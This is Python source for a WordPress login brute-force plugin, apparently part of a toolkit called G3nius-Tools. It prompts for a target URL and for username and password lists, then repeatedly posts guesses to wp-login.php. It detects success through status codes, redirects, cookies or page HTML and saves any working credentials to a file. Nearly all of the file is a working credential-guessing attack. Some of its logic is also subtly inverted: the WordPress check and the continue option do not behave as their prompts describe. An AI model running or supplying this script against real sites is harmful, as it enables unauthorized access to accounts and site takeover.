# import G3nius-Tools
# coding: utf-8

"""     libs       """
# GPL
from lib.classes.gpl import gpl_input, gpl_while_input, gpl_confirm, gpl_set_banner_verion, gpl_clear_and_banner
from lib.classes.gpl import gpl_ask_load_from_file, gpl_ask_save_to_file
from lib.classes.gpl import gpl_http_get, gpl_http_post
from lib.classes.gpl import Handler, Error_Levels
from lib.classes.gpl import gpl_url_encode
from lib.classes.gpl import gpl_wordpress_exists
from lib.classes.core import End_Plugin
from lib.classes.gpl import gpl_sleep

# Plugin
import plugins.WP_loginBruteForce.Configs as Configs
from plugins.WP_loginBruteForce.Found_Login import Found_Login

"""     Set version     """
gpl_set_banner_verion("2.0.0")


"""     Ask      """
URL = gpl_input("Enter URL of target (Like: https://example.com/): ", get_URL=True)

# Checking CMS
if gpl_wordpress_exists(URL):
    gpl_clear_and_banner()
    Handler(Error_Levels.Exclamation, "Can't detect a valid Wordpress!")
    if not gpl_confirm("Are you sure wordpress installed? Force continue", default_return_value=False, clear_and_banner_before=False):
        Handler(Error_Levels.Exclamation, "Attack cancelled. No valid Wordpress detected!")
        End_Plugin()

# Detection methods
Methods = [
    'By HTTP status code (Recommended)',
    'By redirection',
    'By Set Cookie',
    'By HTML'
]
Detection_ID = gpl_while_input("Select once login detection method:", Methods)
del Methods

# Get Username
if gpl_confirm("Do you want use static username", True):
    Usernames = [gpl_input("Enter username: ")]
else:
    Usernames = gpl_ask_load_from_file("Enter file address of usernames: ", read_lines=True)

# Get Password
Passwords = gpl_ask_load_from_file("Enter file address of passwords: ", read_lines=True)

# Get output filename
Result_Filename = gpl_ask_save_to_file("Enter filename to write found logins: ", just_ask=True)

# Verbose?
Verbose = gpl_confirm("Run as verbose output")

# Continue?
if len(Usernames) > 1:
    Continue_On_Found = gpl_confirm('Do you want continue testing other users if password found', default_return_value=True)
Continue_On_Found = False


"""     Detect panel admin      """
if gpl_http_get(URL + '/wp-login.php').status_code == 200:
    Panel_Admin = URL + '/wp-login.php'
else:
    # Can't detect panel admin
    while True:
        Panel_Admin = gpl_input("Failed to detect admin panel, Enter manually: ", get_URL=True)
        if gpl_http_get(Panel_Admin).status_code != 200:
            Handler(Error_Levels.Minus, "Invalid admin panel!")
            gpl_sleep()
        else:
            break

"""     Brute force     """
gpl_clear_and_banner()
for Username in Usernames:
    for Password in Passwords:
        # Flag
        Found = False

        # Request
        Handler(Error_Levels.Star, f"Request to target with {Username}:{Password}")
        Form = {
            'log': Username,
            'pwd': Password,
            'wp-submit': '%D9%88%D8%B1%D9%88%D8%AF',
            'testcookie': '1',
            'redirect_to': gpl_url_encode(URL + '/wp-admin/')
        }
        Response = gpl_http_post(URL + '/wp-login.php', Form)

        # Check blocked
        if Response.status_code != 200 and Response.status_code != 302:
            Handler(Error_Levels.Minus, "Invalid HTTP code! May be blocked by WAF.", f"HTTP status code: {Response.status_code}")
            End_Plugin()

        # Detect result
        if Detection_ID == 1 and Response.status_code == 302:
            # HTTP status
            Found = True
        elif Detection_ID == 2 and 'location' in Response.headers:
            # Redirection
            Found = True
        elif Detection_ID == 3 and 'set-cookie' in Response.headers:
            # Set Cookie
            Found = True
        elif Detection_ID == 4 and (Configs.Login_Form_HTML not in Response.text):
            # HTML content
            Found = True

        # Save found login & Exit option
        if Found:
            if Verbose:
                Handler(Error_Levels.Plus, f"Login found with {Username}:{Password}")
            Found_Login(Result_Filename, URL, Username, Password)
            if not Continue_On_Found:
                End_Plugin()
        else:
            Handler(Error_Levels.Minus, f"Trying with username password {Username}:{Password}, Failed to login.")
